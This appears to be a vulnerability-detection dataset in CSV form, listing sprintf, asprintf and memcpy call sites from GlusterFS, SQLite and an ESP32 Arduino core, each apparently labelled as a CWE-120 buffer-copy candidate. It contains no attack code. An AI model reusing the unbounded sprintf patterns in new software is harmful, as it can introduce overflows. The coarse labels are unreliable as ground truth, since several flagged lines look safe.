2021\cslim\test\libglusterfs\logging.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\logging.cpp.c,"ret = gf_asprintf (&str1, ""[%s] %s [%s:%d:%s] %d-%s: "",",120,1,"                  "".%""""06ld"", tv.tv_usec);

        ret = gf_asprintf (&str1, ""[%s] %s [%s:%d:%s] %d-%s: "",
                           timestr, level_strings[level],
                           basename, line, function,
"
2021\cslim\test\libglusterfs\logging.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\logging.cpp.c,"ret = gf_asprintf (&str1, ""[%d] %s: "",",120,1,"        this = (*__glusterfs_this_location());

        ret = gf_asprintf (&str1, ""[%d] %s: "",
                           ((this->graph)?this->graph->id:0),
                           function);
"
2021\cslim\test\libglusterfs\logging.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\logging.cpp.c,"ret = gf_asprintf (&str1, ""[%s] %s : "",",120,1,"                  "".%""""06ld"", tv.tv_usec);

        ret = gf_asprintf (&str1, ""[%s] %s : "",
                           timestr, domain);
        if (ret == -1) {
"
2021\cslim\test\libglusterfs\mem-pool.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\mem-pool.cpp.c,"ret = gf_asprintf (&mem_pool->name, ""%s:%s"", (*__glusterfs_this_location())->name, name);",120,1,"                return ((void *)0);

        ret = gf_asprintf (&mem_pool->name, ""%s:%s"", (*__glusterfs_this_location())->name, name);
        if (ret < 0)
                return ((void *)0);
"
2021\cslim\test\libglusterfs\run.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\run.cpp.c,"ret = gf_vasprintf (&arg, format, argva);",120,1,"
        __builtin_va_start(argva,format);
        ret = gf_vasprintf (&arg, format, argva);
        __builtin_va_end(argva);

"
2021\cslim\test\libglusterfs\xlator.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\xlator.cpp.c,"ret = gf_asprintf (&name, ""%s/%s.so"", XLATORDIR, xlator_type);",120,1,"
        if (!strstr(xlator_type, ""rpc-transport""))
                ret = gf_asprintf (&name, ""%s/%s.so"", XLATORDIR, xlator_type);
        else
                ret = gf_asprintf (&name, ""%s/%s.so"", XLATORPARENTDIR, xlator_type);
"
2021\cslim\test\libglusterfs\xlator.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\xlator.cpp.c,"ret = gf_asprintf (&name, ""%s/%s.so"", XLATORPARENTDIR, xlator_type);",120,1,"                ret = gf_asprintf (&name, ""%s/%s.so"", XLATORDIR, xlator_type);
        else
                ret = gf_asprintf (&name, ""%s/%s.so"", XLATORPARENTDIR, xlator_type);
        if (-1 == ret) {
                goto out;
"
2021\cslim\test\libglusterfs\xlator.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\xlator.cpp.c,"ret = gf_asprintf (&name, ""%s/%s.so"", XLATORDIR, xl->type);",120,1,"        do { (&xl->volume_options)->next = (&xl->volume_options)->prev = &xl->volume_options; } while (0);

        ret = gf_asprintf (&name, ""%s/%s.so"", XLATORDIR, xl->type);
        if (-1 == ret) {
                goto out;
"
2021\cslim\test\libglusterfs\xlator.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\xlator.cpp.c,"ret = gf_asprintf ((char**)&loc->path, ""<gfid:%s>""""/%s"",",120,1,"                ret = inode_path (loc->parent, bname, (char**)&loc->path);
        } else if (!gf_uuid_is_null (loc->pargfid)) {
                ret = gf_asprintf ((char**)&loc->path, ""<gfid:%s>""""/%s"",
                                   uuid_utoa (loc->pargfid), bname);
        }
"
2021\cslim\test\libglusterfs\xlator.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\xlator.cpp.c,"ret = gf_asprintf ((char**)&loc->path, ""<gfid:%s>"",",120,1,"                ret = inode_path (loc->inode, ((void *)0), (char **)&loc->path);
        } else if (!gf_uuid_is_null (loc->gfid)) {
                ret = gf_asprintf ((char**)&loc->path, ""<gfid:%s>"",
                                   uuid_utoa (loc->gfid));
        }
"
2021\cslim\test\libglusterfs\xlator.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\xlator.cpp.c,"ret = gf_asprintf ((char **)&child->path, ""/%s"", name);",120,1,"
        if (strcmp (parent->path, ""/"") == 0)
                ret = gf_asprintf ((char **)&child->path, ""/%s"", name);
        else
                ret = gf_asprintf ((char **)&child->path, ""%s/%s"", parent->path,
"
2021\cslim\test\libglusterfs\xlator.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\xlator.cpp.c,"ret = gf_asprintf ((char **)&child->path, ""%s/%s"", parent->path,",120,1,"                ret = gf_asprintf ((char **)&child->path, ""/%s"", name);
        else
                ret = gf_asprintf ((char **)&child->path, ""%s/%s"", parent->path,
                                   name);

"
2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\sqlite312-cpp\sqlite3.cpp.c,"if( !(((p)->printfFlags & 0x04)!=0) && p->nChar>0 ) memcpy(zNew, p->zText, p->nChar);",120,1,"
      ((void) (0));
      if( !(((p)->printfFlags & 0x04)!=0) && p->nChar>0 ) memcpy(zNew, p->zText, p->nChar);
      p->zText = zNew;
      p->nAlloc = sqlite3DbMallocSize(p->db, zNew);
"
2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-i2c.c,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-i2c.c,"sprintf(buf1,""%0*d"",lenDigits,tdq->length);",120,1,"        tdq=&i2c->dq[a];
        char buf1[10],buf2[10];
        sprintf(buf1,""%0*d"",lenDigits,tdq->length);
        sprintf(buf2,""%0*d"",lenDigits,tdq->position);
        log_i(""[%0*d] %sbit %x %c %s buf@=%p, len=%s, pos=%s, ctrl=%d%d%d%d%d"",digits,a,
"
2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-i2c.c,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-i2c.c,"sprintf(buf2,""%0*d"",lenDigits,tdq->position);",120,1,"        char buf1[10],buf2[10];
        sprintf(buf1,""%0*d"",lenDigits,tdq->length);
        sprintf(buf2,""%0*d"",lenDigits,tdq->position);
        log_i(""[%0*d] %sbit %x %c %s buf@=%p, len=%s, pos=%s, ctrl=%d%d%d%d%d"",digits,a,
        (tdq->ctrl.addr>0x100)?""10"":""7"",
"
2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-i2c.c,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-i2c.c,"j=sprintf(buff,""0x%04x: "",offset);",120,1,"            buff[139]='\0';
            uint16_t i = 0,j;
            j=sprintf(buff,""0x%04x: "",offset);
            while((i<32)&&(offset < tdq->length)) {
                char ch = tdq->data[offset];
"
2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-i2c.c,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-i2c.c,"sprintf((char*)&buff[(i*3)+41],""%02x "",ch);",120,1,"            while((i<32)&&(offset < tdq->length)) {
                char ch = tdq->data[offset];
                sprintf((char*)&buff[(i*3)+41],""%02x "",ch);
                if((ch<32)||(ch>126)) {
                    ch='.';
"
2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-i2c.c,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-i2c.c,"j+=sprintf((char*)&buff[j],""%c"",ch);",120,1,"                    ch='.';
                }
                j+=sprintf((char*)&buff[j],""%c"",ch);
                buff[j]=' ';
                i++;
"
2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-i2c.c,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-i2c.c,"k+= sprintf(&buf[k],""READ  0x%02X"",(fifoBuffer[i]&0xff)>>1);",120,1,"        if(fifoBuffer[i] & 0x100) { // read
          if(fifoBuffer[i] & 0x1) { // valid read dev id
            k+= sprintf(&buf[k],""READ  0x%02X"",(fifoBuffer[i]&0xff)>>1);
          } else { // invalid read dev id
            k+= sprintf(&buf[k],""Bad READ  0x%02X"",(fifoBuffer[i]&0xff));
"
2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-i2c.c,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-i2c.c,"k+= sprintf(&buf[k],""Bad READ  0x%02X"",(fifoBuffer[i]&0xff));",120,1,"            k+= sprintf(&buf[k],""READ  0x%02X"",(fifoBuffer[i]&0xff)>>1);
          } else { // invalid read dev id
            k+= sprintf(&buf[k],""Bad READ  0x%02X"",(fifoBuffer[i]&0xff));
          }
        } else { // write
"
2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-i2c.c,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-i2c.c,"k+= sprintf(&buf[k],""bad WRITE 0x%02X"",(fifoBuffer[i]&0xff));",120,1,"        } else { // write
          if(fifoBuffer[i] & 0x1) { // bad write dev id
            k+= sprintf(&buf[k],""bad WRITE 0x%02X"",(fifoBuffer[i]&0xff));
          } else { // good Write
            k+= sprintf(&buf[k],""WRITE 0x%02X"",(fifoBuffer[i]&0xff)>>1);
"
2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-i2c.c,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-i2c.c,"k+= sprintf(&buf[k],""WRITE 0x%02X"",(fifoBuffer[i]&0xff)>>1);",120,1,"            k+= sprintf(&buf[k],""bad WRITE 0x%02X"",(fifoBuffer[i]&0xff));
          } else { // good Write
            k+= sprintf(&buf[k],""WRITE 0x%02X"",(fifoBuffer[i]&0xff)>>1);
          }
        }
"
2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-i2c.c,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-i2c.c,"} else k += sprintf(&buf[k],""% 4X "",fifoBuffer[i]);",120,1,"          }
        }
      } else k += sprintf(&buf[k],""% 4X "",fifoBuffer[i]);

      i++;
"
2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-i2c.c,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-i2c.c,"k=sprintf(buf,""-> "");",120,1,"      outBuffer = false;
      if(k>50) {
        k=sprintf(buf,""-> "");
      }
    }while( i!= fifoPos);
"
2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-time.c,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-time.c,"sprintf(cst, ""UTC%ld:%02u:%02u"", offset / 3600, abs((offset % 3600) / 60), abs(offset % 60));",120,1,"
    if(offset % 3600){
        sprintf(cst, ""UTC%ld:%02u:%02u"", offset / 3600, abs((offset % 3600) / 60), abs(offset % 60));
    } else {
        sprintf(cst, ""UTC%ld"", offset / 3600);
"
2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-time.c,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-time.c,"sprintf(cst, ""UTC%ld"", offset / 3600);",120,1,"        sprintf(cst, ""UTC%ld:%02u:%02u"", offset / 3600, abs((offset % 3600) / 60), abs(offset % 60));
    } else {
        sprintf(cst, ""UTC%ld"", offset / 3600);
    }
    if(daylight != 3600){
"
2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-time.c,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-time.c,"sprintf(cdt, ""DST%ld:%02u:%02u"", tz_dst / 3600, abs((tz_dst % 3600) / 60), abs(tz_dst % 60));",120,1,"        long tz_dst = offset - daylight;
        if(tz_dst % 3600){
            sprintf(cdt, ""DST%ld:%02u:%02u"", tz_dst / 3600, abs((tz_dst % 3600) / 60), abs(tz_dst % 60));
        } else {
            sprintf(cdt, ""DST%ld"", tz_dst / 3600);
"
2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-time.c,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-time.c,"sprintf(cdt, ""DST%ld"", tz_dst / 3600);",120,1,"            sprintf(cdt, ""DST%ld:%02u:%02u"", tz_dst / 3600, abs((tz_dst % 3600) / 60), abs(tz_dst % 60));
        } else {
            sprintf(cdt, ""DST%ld"", tz_dst / 3600);
        }
    }
"
2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-time.c,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\cores\esp32\esp32-hal-time.c,"sprintf(tz, ""%s%s"", cst, cdt);",120,1,"        }
    }
    sprintf(tz, ""%s%s"", cst, cdt);
    setenv(""TZ"", tz, 1);
    tzset();
"
2021\deneyapkart-arduino-core\cores\esp32\IPAddress.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\cores\esp32\IPAddress.cpp,"sprintf(szRet,""%u.%u.%u.%u"", _address.bytes[0], _address.bytes[1], _address.bytes[2], _address.bytes[3]);",120,1,"{
    char szRet[16];
    sprintf(szRet,""%u.%u.%u.%u"", _address.bytes[0], _address.bytes[1], _address.bytes[2], _address.bytes[3]);
    return String(szRet);
}
"
2021\deneyapkart-arduino-core\cores\esp32\IPv6Address.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\cores\esp32\IPv6Address.cpp,"sprintf(szRet,""%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x"",",120,1,"{
    char szRet[40];
    sprintf(szRet,""%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x:%02x%02x"",
            _address.bytes[0], _address.bytes[1], _address.bytes[2], _address.bytes[3],
            _address.bytes[4], _address.bytes[5], _address.bytes[6], _address.bytes[7],
"
2021\deneyapkart-arduino-core\cores\esp32\MD5Builder.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\cores\esp32\MD5Builder.cpp,"sprintf(output + (i * 2), ""%02x"", _buf[i]);",120,1,"{
    for(uint8_t i = 0; i < 16; i++) {
        sprintf(output + (i * 2), ""%02x"", _buf[i]);
    }
}
"
2021\deneyapkart-arduino-core\cores\esp32\WString.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\cores\esp32\WString.cpp,"sprintf(buf, ""%d"", value);",120,1,"    char buf[2 + 8 * sizeof(int)];
    if (base == 10) {
        sprintf(buf, ""%d"", value);
    } else {
        itoa(value, buf, base);
"
2021\deneyapkart-arduino-core\cores\esp32\WString.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\cores\esp32\WString.cpp,"sprintf(buf, ""%ld"", value);",120,1,"    char buf[2 + 8 * sizeof(long)];
    if (base==10) {
        sprintf(buf, ""%ld"", value);
    } else {
        ltoa(value, buf, base);
"
2021\deneyapkart-arduino-core\cores\esp32\WString.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\cores\esp32\WString.cpp,"sprintf(buf, ""%d"", num);",120,1,"unsigned char String::concat(unsigned char num) {
    char buf[1 + 3 * sizeof(unsigned char)];
    sprintf(buf, ""%d"", num);
    return concat(buf, strlen(buf));
}
"
2021\deneyapkart-arduino-core\cores\esp32\WString.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\cores\esp32\WString.cpp,"sprintf(buf, ""%ld"", num);",120,1,"unsigned char String::concat(long num) {
    char buf[2 + 3 * sizeof(long)];
    sprintf(buf, ""%ld"", num);
    return concat(buf, strlen(buf));
}
"
2021\deneyapkart-arduino-core\libraries\00_LIBS\src\Adafruit_MQTT.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\libraries\00_LIBS\src\Adafruit_MQTT.cpp,"sprintf(fmt, ""%%%d.%df"", width, prec);",120,1,"                     char *sout) {
  char fmt[20];
  sprintf(fmt, ""%%%d.%df"", width, prec);
  sprintf(sout, fmt, val);
  return sout;
"
2021\deneyapkart-arduino-core\libraries\00_LIBS\src\Adafruit_MQTT.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\libraries\00_LIBS\src\Adafruit_MQTT.cpp,"sprintf(sout, fmt, val);",120,1,"  char fmt[20];
  sprintf(fmt, ""%%%d.%df"", width, prec);
  sprintf(sout, fmt, val);
  return sout;
}
"
2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,"p+=sprintf(p, ""\""framesize\"":%u,"", s->status.framesize);",120,1,"    *p++ = '{';

    p+=sprintf(p, ""\""framesize\"":%u,"", s->status.framesize);
    p+=sprintf(p, ""\""quality\"":%u,"", s->status.quality);
    p+=sprintf(p, ""\""brightness\"":%d,"", s->status.brightness);
"
2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,"p+=sprintf(p, ""\""quality\"":%u,"", s->status.quality);",120,1,"
    p+=sprintf(p, ""\""framesize\"":%u,"", s->status.framesize);
    p+=sprintf(p, ""\""quality\"":%u,"", s->status.quality);
    p+=sprintf(p, ""\""brightness\"":%d,"", s->status.brightness);
    p+=sprintf(p, ""\""contrast\"":%d,"", s->status.contrast);
"
2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,"p+=sprintf(p, ""\""brightness\"":%d,"", s->status.brightness);",120,1,"    p+=sprintf(p, ""\""framesize\"":%u,"", s->status.framesize);
    p+=sprintf(p, ""\""quality\"":%u,"", s->status.quality);
    p+=sprintf(p, ""\""brightness\"":%d,"", s->status.brightness);
    p+=sprintf(p, ""\""contrast\"":%d,"", s->status.contrast);
    p+=sprintf(p, ""\""saturation\"":%d,"", s->status.saturation);
"
2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,"p+=sprintf(p, ""\""contrast\"":%d,"", s->status.contrast);",120,1,"    p+=sprintf(p, ""\""quality\"":%u,"", s->status.quality);
    p+=sprintf(p, ""\""brightness\"":%d,"", s->status.brightness);
    p+=sprintf(p, ""\""contrast\"":%d,"", s->status.contrast);
    p+=sprintf(p, ""\""saturation\"":%d,"", s->status.saturation);
    p+=sprintf(p, ""\""sharpness\"":%d,"", s->status.sharpness);
"
2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,"p+=sprintf(p, ""\""saturation\"":%d,"", s->status.saturation);",120,1,"    p+=sprintf(p, ""\""brightness\"":%d,"", s->status.brightness);
    p+=sprintf(p, ""\""contrast\"":%d,"", s->status.contrast);
    p+=sprintf(p, ""\""saturation\"":%d,"", s->status.saturation);
    p+=sprintf(p, ""\""sharpness\"":%d,"", s->status.sharpness);
    p+=sprintf(p, ""\""special_effect\"":%u,"", s->status.special_effect);
"
2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,"p+=sprintf(p, ""\""sharpness\"":%d,"", s->status.sharpness);",120,1,"    p+=sprintf(p, ""\""contrast\"":%d,"", s->status.contrast);
    p+=sprintf(p, ""\""saturation\"":%d,"", s->status.saturation);
    p+=sprintf(p, ""\""sharpness\"":%d,"", s->status.sharpness);
    p+=sprintf(p, ""\""special_effect\"":%u,"", s->status.special_effect);
    p+=sprintf(p, ""\""wb_mode\"":%u,"", s->status.wb_mode);
"
2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,"p+=sprintf(p, ""\""special_effect\"":%u,"", s->status.special_effect);",120,1,"    p+=sprintf(p, ""\""saturation\"":%d,"", s->status.saturation);
    p+=sprintf(p, ""\""sharpness\"":%d,"", s->status.sharpness);
    p+=sprintf(p, ""\""special_effect\"":%u,"", s->status.special_effect);
    p+=sprintf(p, ""\""wb_mode\"":%u,"", s->status.wb_mode);
    p+=sprintf(p, ""\""awb\"":%u,"", s->status.awb);
"
2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,"p+=sprintf(p, ""\""wb_mode\"":%u,"", s->status.wb_mode);",120,1,"    p+=sprintf(p, ""\""sharpness\"":%d,"", s->status.sharpness);
    p+=sprintf(p, ""\""special_effect\"":%u,"", s->status.special_effect);
    p+=sprintf(p, ""\""wb_mode\"":%u,"", s->status.wb_mode);
    p+=sprintf(p, ""\""awb\"":%u,"", s->status.awb);
    p+=sprintf(p, ""\""awb_gain\"":%u,"", s->status.awb_gain);
"
2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,"p+=sprintf(p, ""\""awb\"":%u,"", s->status.awb);",120,1,"    p+=sprintf(p, ""\""special_effect\"":%u,"", s->status.special_effect);
    p+=sprintf(p, ""\""wb_mode\"":%u,"", s->status.wb_mode);
    p+=sprintf(p, ""\""awb\"":%u,"", s->status.awb);
    p+=sprintf(p, ""\""awb_gain\"":%u,"", s->status.awb_gain);
    p+=sprintf(p, ""\""aec\"":%u,"", s->status.aec);
"
2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,"p+=sprintf(p, ""\""awb_gain\"":%u,"", s->status.awb_gain);",120,1,"    p+=sprintf(p, ""\""wb_mode\"":%u,"", s->status.wb_mode);
    p+=sprintf(p, ""\""awb\"":%u,"", s->status.awb);
    p+=sprintf(p, ""\""awb_gain\"":%u,"", s->status.awb_gain);
    p+=sprintf(p, ""\""aec\"":%u,"", s->status.aec);
    p+=sprintf(p, ""\""aec2\"":%u,"", s->status.aec2);
"
2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,"p+=sprintf(p, ""\""aec\"":%u,"", s->status.aec);",120,1,"    p+=sprintf(p, ""\""awb\"":%u,"", s->status.awb);
    p+=sprintf(p, ""\""awb_gain\"":%u,"", s->status.awb_gain);
    p+=sprintf(p, ""\""aec\"":%u,"", s->status.aec);
    p+=sprintf(p, ""\""aec2\"":%u,"", s->status.aec2);
    p+=sprintf(p, ""\""ae_level\"":%d,"", s->status.ae_level);
"
2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,"p+=sprintf(p, ""\""aec2\"":%u,"", s->status.aec2);",120,1,"    p+=sprintf(p, ""\""awb_gain\"":%u,"", s->status.awb_gain);
    p+=sprintf(p, ""\""aec\"":%u,"", s->status.aec);
    p+=sprintf(p, ""\""aec2\"":%u,"", s->status.aec2);
    p+=sprintf(p, ""\""ae_level\"":%d,"", s->status.ae_level);
    p+=sprintf(p, ""\""aec_value\"":%u,"", s->status.aec_value);
"
2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,"p+=sprintf(p, ""\""ae_level\"":%d,"", s->status.ae_level);",120,1,"    p+=sprintf(p, ""\""aec\"":%u,"", s->status.aec);
    p+=sprintf(p, ""\""aec2\"":%u,"", s->status.aec2);
    p+=sprintf(p, ""\""ae_level\"":%d,"", s->status.ae_level);
    p+=sprintf(p, ""\""aec_value\"":%u,"", s->status.aec_value);
    p+=sprintf(p, ""\""agc\"":%u,"", s->status.agc);
"
2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,"p+=sprintf(p, ""\""aec_value\"":%u,"", s->status.aec_value);",120,1,"    p+=sprintf(p, ""\""aec2\"":%u,"", s->status.aec2);
    p+=sprintf(p, ""\""ae_level\"":%d,"", s->status.ae_level);
    p+=sprintf(p, ""\""aec_value\"":%u,"", s->status.aec_value);
    p+=sprintf(p, ""\""agc\"":%u,"", s->status.agc);
    p+=sprintf(p, ""\""agc_gain\"":%u,"", s->status.agc_gain);
"
2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,"p+=sprintf(p, ""\""agc\"":%u,"", s->status.agc);",120,1,"    p+=sprintf(p, ""\""ae_level\"":%d,"", s->status.ae_level);
    p+=sprintf(p, ""\""aec_value\"":%u,"", s->status.aec_value);
    p+=sprintf(p, ""\""agc\"":%u,"", s->status.agc);
    p+=sprintf(p, ""\""agc_gain\"":%u,"", s->status.agc_gain);
    p+=sprintf(p, ""\""gainceiling\"":%u,"", s->status.gainceiling);
"
2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,"p+=sprintf(p, ""\""agc_gain\"":%u,"", s->status.agc_gain);",120,1,"    p+=sprintf(p, ""\""aec_value\"":%u,"", s->status.aec_value);
    p+=sprintf(p, ""\""agc\"":%u,"", s->status.agc);
    p+=sprintf(p, ""\""agc_gain\"":%u,"", s->status.agc_gain);
    p+=sprintf(p, ""\""gainceiling\"":%u,"", s->status.gainceiling);
    p+=sprintf(p, ""\""bpc\"":%u,"", s->status.bpc);
"
2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,"p+=sprintf(p, ""\""gainceiling\"":%u,"", s->status.gainceiling);",120,1,"    p+=sprintf(p, ""\""agc\"":%u,"", s->status.agc);
    p+=sprintf(p, ""\""agc_gain\"":%u,"", s->status.agc_gain);
    p+=sprintf(p, ""\""gainceiling\"":%u,"", s->status.gainceiling);
    p+=sprintf(p, ""\""bpc\"":%u,"", s->status.bpc);
    p+=sprintf(p, ""\""wpc\"":%u,"", s->status.wpc);
"
2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,"p+=sprintf(p, ""\""bpc\"":%u,"", s->status.bpc);",120,1,"    p+=sprintf(p, ""\""agc_gain\"":%u,"", s->status.agc_gain);
    p+=sprintf(p, ""\""gainceiling\"":%u,"", s->status.gainceiling);
    p+=sprintf(p, ""\""bpc\"":%u,"", s->status.bpc);
    p+=sprintf(p, ""\""wpc\"":%u,"", s->status.wpc);
    p+=sprintf(p, ""\""raw_gma\"":%u,"", s->status.raw_gma);
"
2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,"p+=sprintf(p, ""\""wpc\"":%u,"", s->status.wpc);",120,1,"    p+=sprintf(p, ""\""gainceiling\"":%u,"", s->status.gainceiling);
    p+=sprintf(p, ""\""bpc\"":%u,"", s->status.bpc);
    p+=sprintf(p, ""\""wpc\"":%u,"", s->status.wpc);
    p+=sprintf(p, ""\""raw_gma\"":%u,"", s->status.raw_gma);
    p+=sprintf(p, ""\""lenc\"":%u,"", s->status.lenc);
"
2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,Dataset Download,../../Dataset Download/2021\deneyapkart-arduino-core\libraries\00_OutOfBox\examples\CameraStream\app_httpd.cpp,"p+=sprintf(p, ""\""raw_gma\"":%u,"", s->status.raw_gma);",120,1,"    p+=sprintf(p, ""\""bpc\"":%u,"", s->status.bpc);
    p+=sprintf(p, ""\""wpc\"":%u,"", s->status.wpc);
    p+=sprintf(p, ""\""raw_gma\"":%u,"", s->status.raw_gma);
    p+=sprintf(p, ""\""lenc\"":%u,"", s->status.lenc);
    p+=sprintf(p, ""\""vflip\"":%u,"", s->status.vflip);
"
